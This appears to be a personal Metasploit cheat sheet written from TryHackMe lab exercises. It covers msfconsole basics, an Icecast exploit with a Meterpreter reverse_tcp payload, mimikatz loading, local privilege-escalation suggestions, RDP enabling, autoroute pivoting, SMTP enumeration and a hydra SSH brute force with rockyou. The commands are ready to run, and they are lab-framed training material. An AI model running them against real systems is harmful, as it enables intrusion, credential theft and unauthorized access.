First use metasploit
```bash
msfdb init
```

help
```bash
msfconsole -h

msf5 > help
```

checking DB
```bash
msf5 > db_status
```

make quick connection to host
```bash
msf5 > connect [options] <host> <port>
```
## Module
Search module
```bash
msf5 > search <module>
```

Use module
```bash
msf5 > use <module>
```

Load module
```bash
msf5 > load <module>
```

Check module info
```bash
msf5 > info <module>
```

use module with search
```bash
msf5 > search multi/handler
Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
   2  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
   5  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
   6  exploit/multi/handler                                                 manual     No     Generic Payload Handler

msf5 > use 6
```

![](https://imgur.com/vKe4ZDj.png)

Major modules:
* Exploit : most common
* Payload : shellcode
* Encoder : in payload obfuscation, avoid signature detection
* NOP : buffer overflow
* Auxiliary : scanning & verification
* Post : looting & pivoting
## Variable

Change value of variable
```bash
msf5 > set <value>
```

Change value of variable globally
```bash
msf5 > setg <value>
```

get value of variable 
```bash
msf5 > get <value>
```

change value to null/no value
```bash
msf5 > unset <value>
```

save console output to a file
```bash
msf5 > spool
```

store setting 
```baSh
mfs5 > save
```

## Example1

run nmap & feed result to db
(-sV : detect the version of services running)
```bash
msf5 > db_nmap -sV <ip>
```

check hosts information in db
```bash
msf5 > hosts
```

check hosts 's services in db
```bash
msf5 > services
```

check hosts 's vulnerablilities
```bash
msf5 > vulns
```

connecting to it with metasploit payload
```bash
msf5 > use icecast
```

search & use  multi/handler
```bash
msf5 > search multi/handler
msf5 > use NUMBER_NEXT_TO_exploit/multi/handler
```

set variables
```bash
msf5 > set PAYLOAD windows/meterpreter/reverse_tcp
msf5 > set LHOST <YOUR_IP_ON_TRYHACKME>
```

return previous exploit
```bash
msf5 > use icecast
```

set attack target
```bash
msf5 > set RHOSTS 10.10.8.33
```

run exploit
`explit` or `run -j`

check running jobs
```bash
msf5 > jobs
```

check sessions & attack
```bash
msf5 > sessions
msf5 > sessions -i 2
```

transfer ourself to process
```bash
msf5 > migrate <PID>
```

get user info & system info & user privileges
```bash
msf5 > getuid
msf5 > sysinfo
msf5 > getprivs
```

load mimikatz
```bash
msf5 > load kiwi
```


check vm
```bash
msf5 > run post/windows/gather/checkvm
```

check exploit suggester
```bash
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.204.88 - Collecting local exploits for x86/windows...
[*] 10.10.204.88 - 34 exploit checks are being tried...
[+] 10.10.204.88 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.204.88 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.204.88 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.204.88 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.204.88 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.204.88 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.204.88 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.204.88 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.204.88 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.

```


forcing RDP to be avaliable (need administrator)
```bash
msf5 > run post/windows/manage/enable_rdp
```

check autorouting options : help menu
```bash
msf5 > run autoroute -h
```

autoroute add subnet (`172.18.1.0/24`)
```bash
msf5 > run autoroute -s 172.18.1.0 -n 255.255.255.0
```

KEYWORDS:
1. icecast
2. multi/handler


## Example2 :SMTP

### SMTP version
search smtp_version
```bash
msf5 > search smtp_version
msf5 > use 0
```

list options 
```bash
msf5 auxiliary(scanner/smtp/smtp_version) > options
```

set RHOSTS
```bash
msf5 auxiliary(scanner/smtp/smtp_version) > set RHOSTS 10.10.213.212
```

run exploit
```bash
msf5 auxiliary(scanner/smtp/smtp_version) > exploit

[+] 10.10.213.212:25      - 10.10.213.212:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 10.10.213.212:25      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
we get the system mail name : *polosmtp.home*

### SMTP ENUM
search smtp_enum
```bash
msf5 > search smtp_enum
msf5 > use 0
```

list options
```bash
msf5 auxiliary(scanner/smtp/smtp_enum) > options
```

set USER_FILE
```bash
msf5 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
```

```bash
exploit
```

### BRUTE FORCE

```bash
hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV <IP> ssh
```
* -t : parallel connections
* -l : username
* -P : point the file
* -vV : very verbose
* ssh : set protocol to ssh

ex 
```bash
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.213.212 ssh
```